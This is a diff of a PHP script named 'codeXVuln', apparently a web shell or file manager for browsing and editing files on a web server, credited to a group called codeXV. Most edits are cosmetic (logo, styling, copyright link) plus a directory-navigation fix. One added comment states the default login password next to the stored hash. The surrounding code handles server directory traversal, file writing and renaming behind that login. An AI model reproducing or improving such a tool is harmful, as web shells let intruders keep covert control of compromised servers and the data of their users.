@@ -3,7 +3,7 @@
 session_name( 'session-codeXVuln' );
 session_start();
 
-
+// default password qwerty123
 $password = '$2y$10$yQ4zzKVKdFZgAzRPm3j/Fu02r19mEeQQwpXLUls76iKdAyoYtWlLy';
 if(@$_POST['action'] == 'login'){
   cekLogin($_POST['password']);
@@ -45,9 +45,11 @@ for($i = 0; $i < count($dirPecah); $i++){
 // print_r($dirPecah);
 $dir = join("/",$dirPecah);
 $dir = $dirServer.$dir;
-unset($dirPecah[count($dirPecah)-1]);
+// unset($dirPecah[count($dirPecah)-1]);
+array_pop($dirPecah);
 $dirBack = join("/",$dirPecah);
-$dirBack = $dirServer.$dirBack;
+$dirBack = $dirBack==""?$dirServer:$dirBack;
+// $dirBack = $dirServer.$dirBack;
 
 if(@$_POST['action']){
     if($_POST['action'] == 'setFile'){
@@ -168,6 +170,7 @@ function viewLogin(){
     padding: 5px;
     color: white;
     width: 230px;
+    text-align: center;
   }
   
   </style>
@@ -259,14 +262,25 @@ function logout(){
         /* background-color: #333333; */
     }
 
+    .logo{
+      width: 60px;
+    }
+
+    .logo-text{
+      font-size: 20px;
+    }
+
     </style>
 
 </head>
 <body>
 
     <div class="my-container">
-     
-        <h3>codeXVuln</h3>
+    <center>
+    <img class="logo" src="<?=$img?>" alt="">
+        <span class="logo-text">codeXVuln</span>
+    </center>
+        
         <br>
         <div class="row">
           <div class="col-md-6">
@@ -343,6 +357,8 @@ function logout(){
             </tbody>
         </table>
         <hr>
+        <center>copyright &copy; 2020 - <a style="color: yellow" href="https://www.instagram.com/codexv.group/">codeXV</a></center>
+        <br>
         <?php
         if(@$_GET['rename']){
         ?>
